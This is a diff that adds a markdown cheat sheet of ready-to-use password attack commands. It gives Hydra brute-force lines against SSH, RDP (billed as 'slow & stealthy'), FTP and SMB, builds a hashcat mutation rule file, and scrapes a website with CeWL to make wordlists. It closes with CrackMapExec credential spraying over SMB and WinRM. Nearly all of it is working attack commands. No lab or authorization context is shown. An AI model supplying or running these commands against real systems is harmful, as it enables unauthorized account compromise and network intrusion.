@@ -1,0 +1,58 @@
+🔐 Hydra Script Templates (Plug & Play)
+1. Basic Hydra SSH Brute
+bash
+Copy
+Edit
+hydra -L users.txt -P passwords.txt ssh://<TARGET-IP> -t 4 -V
+2. Hydra RDP Brute (Slow & stealthy)
+bash
+Copy
+Edit
+hydra -L users.txt -P passwords.txt rdp://<TARGET-IP> -t 1 -W 3 -V
+3. Hydra FTP Brute (Fastest to use for leak → pivot)
+bash
+Copy
+Edit
+hydra -L users.txt -P passwords.txt ftp://<TARGET-IP> -t 8 -V
+4. Hydra SMB (Windows Shares)
+⚠️ Needs tweaking for older/newer SMB versions
+
+bash
+Copy
+Edit
+hydra -L users.txt -P passwords.txt smb://<TARGET-IP> -V -t 1
+🧠 Hashcat Password Mutation Pipeline
+1. Basic combo with custom.rule
+bash
+Copy
+Edit
+hashcat --force password.list -r custom.rule --stdout > mut_passwords.list
+2. Generate custom.rule quickly
+bash
+Copy
+Edit
+cat <<EOF > custom.rule
+:
+c
+$!
+c $!
+sa@
+so0
+c sa@ so0 $!
+EOF
+🌐 CeWL Recon to Wordlist + Hashcat Rule Combo
+bash
+Copy
+Edit
+# Spider a target site for useful words
+cewl https://example.com -d 3 -m 5 --lowercase -w basewords.txt
+
+# Apply mutations via hashcat
+hashcat --force basewords.txt -r /usr/share/hashcat/rules/best64.rule --stdout > final_passwords.txt
+💣 CrackMapExec Shotgun Auth Spray
+bash
+Copy
+Edit
+# Try creds across SMB/WinRM
+crackmapexec smb <TARGET-IP> -u users.txt -p mut_passwords.list
+crackmapexec winrm <TARGET-IP> -u users.txt -p mut_passwords.list
